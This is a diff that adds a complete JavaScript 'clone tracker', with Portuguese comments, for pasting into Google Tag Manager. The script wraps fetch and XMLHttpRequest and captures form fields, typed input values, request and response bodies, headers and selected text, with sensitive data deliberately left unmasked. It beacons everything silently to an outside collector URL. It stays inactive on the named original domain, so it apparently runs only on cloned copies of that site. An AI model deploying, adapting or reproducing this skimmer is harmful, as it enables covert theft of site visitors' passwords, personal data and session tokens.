@@ -1,0 +1,468 @@
+<!--
+  CLONE TRACKER - VERSÃO FINAL COMPLETA
+
+  - Captura TUDO (fetch, xhr, cliques, formulários, inputs, scroll, etc)
+  - SEM console.log (modo silencioso)
+  - Ignora Clarity e outros trackers
+  - Compatível ES5 (GTM)
+  - Sem mascaramento de dados sensíveis
+
+  CONFIGURAÇÃO GTM:
+  1. Tags > Nova > HTML Personalizado
+  2. Cole este código completo
+  3. Acionador: Window Loaded (ou All Pages)
+  4. Prioridade: 999
+  5. Publicar
+-->
+
+<script>
+(function() {
+    'use strict';
+
+    var COLLECTOR_URL = 'https://cc-sorteador.on-forge.com/api/collect';
+
+    // ========== CONFIGURAÇÃO DO DOMÍNIO ORIGINAL ==========
+    // Coloque aqui o domínio do seu site ORIGINAL
+    // O script NÃO vai capturar nada neste domínio
+    var ORIGINAL_DOMAIN = 'sorteador.com.br'; // ← ALTERE AQUI
+
+    var IGNORED_URLS = [
+        'q.clarity.ms/collect',
+        'clarity.ms',
+        'google-analytics.com',
+        'googletagmanager.com',
+        'googlesyndication.com',
+        'doubleclick.net',
+        'facebook.com/tr',
+        'analytics.tiktok.com',
+        'hotjar.com',
+        'mouseflow.com'
+    ];
+
+    var win = window;
+    var doc = document;
+
+    try {
+        if (window.top && window.top.document) {
+            win = window.top;
+            doc = window.top.document;
+        }
+    } catch (e) {}
+
+    // ========== VERIFICAR SE ESTÁ NO DOMÍNIO ORIGINAL ==========
+    // Se estiver no domínio original, NÃO executa nada
+    var currentDomain = win.location.hostname.toLowerCase();
+    if (currentDomain.indexOf(ORIGINAL_DOMAIN.toLowerCase()) > -1) {
+        return; // Sai do script sem fazer nada
+    }
+
+    if (!win.__CT) {
+        win.__CT = {
+            init: false,
+            reqs: [],
+            sid: null,
+            oFetch: win.fetch,
+            oXHROpen: win.XMLHttpRequest ? win.XMLHttpRequest.prototype.open : null,
+            oXHRSend: win.XMLHttpRequest ? win.XMLHttpRequest.prototype.send : null
+        };
+    }
+
+    var CT = win.__CT;
+
+    if (CT.init) return;
+    CT.init = true;
+
+    function ignore(url) {
+        if (!url) return false;
+        var u = String(url).toLowerCase();
+        for (var i = 0; i < IGNORED_URLS.length; i++) {
+            if (u.indexOf(IGNORED_URLS[i]) > -1) return true;
+        }
+        return false;
+    }
+
+    function getSid() {
+        if (CT.sid) return CT.sid;
+        try {
+            var s = win.sessionStorage.getItem('_ct_sid');
+            if (s) {
+                CT.sid = s;
+                return s;
+            }
+        } catch (e) {}
+        CT.sid = 's_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        try {
+            win.sessionStorage.setItem('_ct_sid', CT.sid);
+        } catch (e) {}
+        return CT.sid;
+    }
+
+    function add(obj) {
+        obj.ts = new Date().toISOString();
+        CT.reqs.push(obj);
+    }
+
+    function send() {
+        if (CT.reqs.length === 0) return;
+
+        var data = {
+            sessionId: getSid(),
+            domain: win.location.hostname || 'unknown',
+            url: win.location.href || '',
+            referrer: doc.referrer || '',
+            screenResolution: (win.screen.width || 0) + 'x' + (win.screen.height || 0),
+            language: win.navigator.language || 'unknown',
+            timestamp: new Date().toISOString(),
+            requests: []
+        };
+
+        for (var i = 0; i < CT.reqs.length; i++) {
+            data.requests.push(CT.reqs[i]);
+        }
+
+        CT.reqs = [];
+
+        if (CT.oFetch && typeof CT.oFetch === 'function') {
+            CT.oFetch.call(win, COLLECTOR_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+                mode: 'cors'
+            }).then(function() {}).catch(function() {});
+        } else {
+            try {
+                var x = new win.XMLHttpRequest();
+                x.open('POST', COLLECTOR_URL, true);
+                x.setRequestHeader('Content-Type', 'application/json');
+                x.send(JSON.stringify(data));
+            } catch (e) {}
+        }
+    }
+
+    // FETCH
+    if (CT.oFetch) {
+        win.fetch = function() {
+            var args = Array.prototype.slice.call(arguments);
+            var url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
+            var opts = args[1] || {};
+
+            if (url.indexOf('/api/collect') === -1 && !ignore(url)) {
+                var req = {
+                    type: 'fetch',
+                    url: url,
+                    method: opts.method || 'GET'
+                };
+
+                if (opts.headers) {
+                    try {
+                        req.headers = JSON.parse(JSON.stringify(opts.headers));
+                    } catch (e) {}
+                }
+
+                if (opts.body) {
+                    try {
+                        req.body = String(opts.body).substring(0, 5000);
+                    } catch (e) {}
+                }
+
+                add(req);
+
+                return CT.oFetch.apply(this, args).then(function(r) {
+                    var res = {
+                        type: 'fetch_response',
+                        url: url,
+                        status: r.status,
+                        statusText: r.statusText
+                    };
+
+                    var cr = r.clone();
+                    cr.text().then(function(t) {
+                        try {
+                            res.body = JSON.parse(t);
+                        } catch (e) {
+                            res.bodyText = t.substring(0, 5000);
+                        }
+                        add(res);
+                    }).catch(function() {});
+
+                    return r;
+                }).catch(function(e) {
+                    return Promise.reject(e);
+                });
+            }
+
+            return CT.oFetch.apply(this, args);
+        };
+    }
+
+    // XHR
+    if (CT.oXHROpen && CT.oXHRSend) {
+        win.XMLHttpRequest.prototype.open = function(m, u) {
+            if (!ignore(u)) {
+                this._ct = { method: m, url: u };
+            } else {
+                this._ctIgnore = true;
+            }
+            return CT.oXHROpen.apply(this, arguments);
+        };
+
+        win.XMLHttpRequest.prototype.send = function(body) {
+            var self = this;
+
+            if (!this._ctIgnore && this._ct) {
+                var req = {
+                    type: 'xhr',
+                    url: this._ct.url,
+                    method: this._ct.method
+                };
+
+                if (body) {
+                    try {
+                        req.body = String(body).substring(0, 5000);
+                    } catch (e) {}
+                }
+
+                add(req);
+
+                this.addEventListener('load', function() {
+                    var res = {
+                        type: 'xhr_response',
+                        url: self._ct.url,
+                        status: self.status,
+                        statusText: self.statusText
+                    };
+
+                    try {
+                        res.body = JSON.parse(self.responseText);
+                    } catch (e) {
+                        res.bodyText = String(self.responseText).substring(0, 5000);
+                    }
+
+                    add(res);
+                });
+            }
+
+            return CT.oXHRSend.apply(this, arguments);
+        };
+    }
+
+    // CLIQUES
+    doc.addEventListener('click', function(e) {
+        var el = e.target;
+        if (!el) return;
+
+        add({
+            type: 'click',
+            tag: el.tagName || '',
+            id: el.id || '',
+            class: el.className || '',
+            text: (el.innerText || '').substring(0, 200),
+            href: el.href || '',
+            x: e.clientX,
+            y: e.clientY
+        });
+    }, true);
+
+    // FORMULÁRIOS
+    doc.addEventListener('submit', function(e) {
+        var f = e.target;
+        var fields = {};
+        var inputs = f.querySelectorAll('input, textarea, select');
+
+        for (var i = 0; i < inputs.length; i++) {
+            var inp = inputs[i];
+            var name = inp.name || inp.id || 'field_' + i;
+            fields[name] = inp.value;
+        }
+
+        add({
+            type: 'form_submit',
+            action: f.action,
+            method: f.method,
+            fields: fields
+        });
+    }, true);
+
+    // INPUTS
+    var inputTimers = {};
+    doc.addEventListener('input', function(e) {
+        var inp = e.target;
+        if (inp.tagName === 'INPUT' || inp.tagName === 'TEXTAREA') {
+            var name = inp.name || inp.id || 'unknown';
+
+            clearTimeout(inputTimers[name]);
+            inputTimers[name] = setTimeout(function() {
+                add({
+                    type: 'input',
+                    field: name,
+                    fieldType: inp.type || '',
+                    value: inp.value
+                });
+            }, 800);
+        }
+    }, true);
+
+    // MUDANÇA DE FOCO
+    doc.addEventListener('focus', function(e) {
+        var el = e.target;
+        if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
+            add({
+                type: 'focus',
+                field: el.name || el.id || 'unknown',
+                tag: el.tagName
+            });
+        }
+    }, true);
+
+    // BLUR (perda de foco)
+    doc.addEventListener('blur', function(e) {
+        var el = e.target;
+        if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
+            add({
+                type: 'blur',
+                field: el.name || el.id || 'unknown',
+                value: el.value
+            });
+        }
+    }, true);
+
+    // MUDANÇAS (checkboxes, radio, select)
+    doc.addEventListener('change', function(e) {
+        var el = e.target;
+        if (el && (el.tagName === 'INPUT' || el.tagName === 'SELECT')) {
+            add({
+                type: 'change',
+                field: el.name || el.id || 'unknown',
+                value: el.value,
+                checked: el.checked
+            });
+        }
+    }, true);
+
+    // SCROLL
+    var scrollTimer = null;
+    win.addEventListener('scroll', function() {
+        clearTimeout(scrollTimer);
+        scrollTimer = setTimeout(function() {
+            add({
+                type: 'scroll',
+                x: win.pageXOffset || doc.documentElement.scrollLeft,
+                y: win.pageYOffset || doc.documentElement.scrollTop
+            });
+        }, 1000);
+    }, true);
+
+    // MOUSE MOVE (amostragem - a cada 2 segundos)
+    var lastMouseMove = 0;
+    doc.addEventListener('mousemove', function(e) {
+        var now = Date.now();
+        if (now - lastMouseMove > 2000) {
+            lastMouseMove = now;
+            add({
+                type: 'mouse',
+                x: e.clientX,
+                y: e.clientY
+            });
+        }
+    }, true);
+
+    // VISIBILIDADE DA PÁGINA
+    doc.addEventListener('visibilitychange', function() {
+        add({
+            type: 'visibility',
+            hidden: doc.hidden
+        });
+    });
+
+    // RESIZE
+    var resizeTimer = null;
+    win.addEventListener('resize', function() {
+        clearTimeout(resizeTimer);
+        resizeTimer = setTimeout(function() {
+            add({
+                type: 'resize',
+                width: win.innerWidth,
+                height: win.innerHeight
+            });
+        }, 500);
+    });
+
+    // COPIA/COLA
+    doc.addEventListener('copy', function() {
+        add({ type: 'copy' });
+    });
+
+    doc.addEventListener('paste', function() {
+        add({ type: 'paste' });
+    });
+
+    doc.addEventListener('cut', function() {
+        add({ type: 'cut' });
+    });
+
+    // SELEÇÃO DE TEXTO
+    var selectionTimer = null;
+    doc.addEventListener('selectionchange', function() {
+        clearTimeout(selectionTimer);
+        selectionTimer = setTimeout(function() {
+            var sel = win.getSelection ? win.getSelection().toString() : '';
+            if (sel && sel.length > 0) {
+                add({
+                    type: 'selection',
+                    text: sel.substring(0, 500)
+                });
+            }
+        }, 1000);
+    });
+
+    // NAVEGAÇÃO (histórico)
+    win.addEventListener('popstate', function() {
+        add({
+            type: 'popstate',
+            url: win.location.href
+        });
+    });
+
+    // HASH CHANGE
+    win.addEventListener('hashchange', function() {
+        add({
+            type: 'hashchange',
+            hash: win.location.hash
+        });
+    });
+
+    // ENVIO PERIÓDICO
+    setInterval(send, 10000);
+
+    // ENVIO AO SAIR
+    win.addEventListener('beforeunload', function() {
+        if (CT.reqs.length > 0 && win.navigator.sendBeacon) {
+            var data = {
+                sessionId: getSid(),
+                domain: win.location.hostname,
+                url: win.location.href,
+                referrer: doc.referrer,
+                screenResolution: win.screen.width + 'x' + win.screen.height,
+                language: win.navigator.language,
+                timestamp: new Date().toISOString(),
+                requests: CT.reqs
+            };
+
+            win.navigator.sendBeacon(COLLECTOR_URL, JSON.stringify(data));
+            CT.reqs = [];
+        }
+    });
+
+    // EVENTO INICIAL
+    add({
+        type: 'page_load',
+        url: win.location.href,
+        title: doc.title,
+        referrer: doc.referrer
+    });
+
+    // PRIMEIRA CHAMADA
+    setTimeout(send, 2000);
+
+})();
+</script>
